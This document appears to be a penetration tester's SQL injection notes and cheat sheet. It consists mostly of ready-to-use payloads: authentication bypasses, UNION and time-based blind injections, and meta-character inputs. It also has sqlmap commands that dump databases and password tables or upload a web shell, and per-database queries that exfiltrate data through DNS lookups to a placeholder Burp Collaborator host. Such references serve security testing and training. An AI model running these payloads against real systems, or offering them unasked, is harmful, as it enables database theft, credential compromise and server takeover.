# SQL Injection 
A SQL injection is an attack in which the attacker executes arbitrary SQL
commands on an application’s database by supplying malicious input inserted into a SQL statement.

# Injecting Code into SQL Queries
A SQL injection attack occurs when an attacker is able to inject code into the
SQL statements that the target web application uses to access its database,
thereby executing whatever SQL code the attacker wishes.

# Sample Queries
SELECT id FROM users WHERE username='admin';-- ' AND Password='password123';
The -- sequence denotes the start of a SQL comment, which doesn’t get interpreted as code, 
so by adding -- into the username part of the query, the attacker effectively comments out the rest of the SQL query. 
The query becomes this: SELECT id FROM users WHERE username='admin';


    SELECT title, body FROM emails 
    WHERE username='vickie' 
    AND accesskey='ZB6w0YLjzvAVmp6zvr'
    UNION SELECT 1,
    CONVERT((SELECT password FROM users WHERE username="admin"), DATE);--

    ' or sleep(15) and 1=1#
    ' or sleep(15)#
    ' union select sleep(15),null#

Meta Characters

    '
    ''
    ;%00
    --
    -- -
    ""
    ;
    ' OR '1
    ' OR 1 -- -
    " OR "" = "
    " OR 1 = 1 -- -
    ' OR '' = '
    OR 1=1

# Reports 
[Orange's SQL Injection on Uber](https://hackerone.com/reports/150156/)

# SQLMap 
1 Saved burp req
2 sqlmap -r 
-r = path to saved req
-p = parameter to test for 

> sqlmap -r /home/hapihacker/burprequest1 -p vuln-param –dump-all

If you’re not interested in dumping the entire database, you could use
the --dump command to specify the exact table and columns you would like:
> sqlmap -r /home/hapihacker/burprequest1 -p vuln-param –dump -T users -C password -D helpdesk

Sometimes SQL injection vulnerabilities will allow you to upload a web
shell to the server that can then be executed to obtain system access. You
could use one of SQLmap’s commands to automatically attempt to upload a
web shell and execute the shell to grant you with system access:
> sqlmap -r /home/hapihacker/burprequest1 -p vuln-param –os-shell


# SQL injection cheat sheet

## String concatenation
====================
Oracle 	        'foo'||'bar'
Microsoft 	    'foo'+'bar'
PostgreSQL 	    'foo'||'bar' and 'foo' 'bar' [Note the space between the two strings]
MySQL 	        CONCAT('foo','bar')


## Substring
====================
Each of the following expressions will return the string ba.
Oracle 	SUBSTR('foobar', 4, 2)
Microsoft, PostgreSQL, MySQL 	SUBSTRING('foobar', 4, 2)

## Comments
====================
Oracle     	--comment
Microsoft	--comment or /*comment*/
PostgreSQL 	--comment or /*comment*/ or  #comment
MySQL 	    -- comment [Note the space after the double dash] or /*comment*/

## Database version
====================
Oracle 	    SELECT banner FROM v$version or SELECT version FROM v$instance
Microsoft 	SELECT @@version
PostgreSQL 	SELECT version()
MySQL 	    SELECT @@version

## Database contents
====================
You can list the tables that exist in the database, and the columns that those tables contain.
Oracle 	        SELECT * FROM all_tables or SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'

Microsoft, PostgreSQL, MySQL 	    
SELECT * FROM information_schema.tables or SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'


## Conditional errors
====================
You can test a single boolean condition and trigger a database error if the condition is true.
Oracle 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
Microsoft 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
PostgreSQL 	1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
MySQL 	SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
Extracting data via visible error messages

You can potentially elicit error messages that leak sensitive data returned by your malicious query.
Microsoft 	SELECT 'foo' WHERE 1 = (SELECT 'secret')
> Conversion failed when converting the varchar value 'secret' to data type int.
PostgreSQL 	SELECT CAST((SELECT password FROM users LIMIT 1) AS int)
> invalid input syntax for integer: "secret"
MySQL 	SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
> XPATH syntax error: '\secret'
Batched (or stacked) queries

You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.
Oracle 	Does not support batched queries.
Microsoft 	QUERY-1-HERE; QUERY-2-HERE
QUERY-1-HERE QUERY-2-HERE
PostgreSQL 	QUERY-1-HERE; QUERY-2-HERE
MySQL 	QUERY-1-HERE; QUERY-2-HERE
Note

With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.
Time delays

You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.
Oracle 	dbms_pipe.receive_message(('a'),10)
Microsoft 	WAITFOR DELAY '0:0:10'
PostgreSQL 	SELECT pg_sleep(10)
MySQL 	SELECT SLEEP(10)
Conditional time delays

You can test a single boolean condition and trigger a time delay if the condition is true.
Oracle 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
Microsoft 	IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
PostgreSQL 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
MySQL 	SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
DNS lookup

You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.
Oracle 	

(XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual

The following technique works on fully patched Oracle installations, but requires elevated privileges:
SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
Microsoft 	exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
PostgreSQL 	copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
MySQL 	

The following techniques work on Windows only:
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
DNS lookup with data exfiltration

You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.
Oracle 	SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
Microsoft 	declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
PostgreSQL 	create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
MySQL 	The following technique works on Windows only:
SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'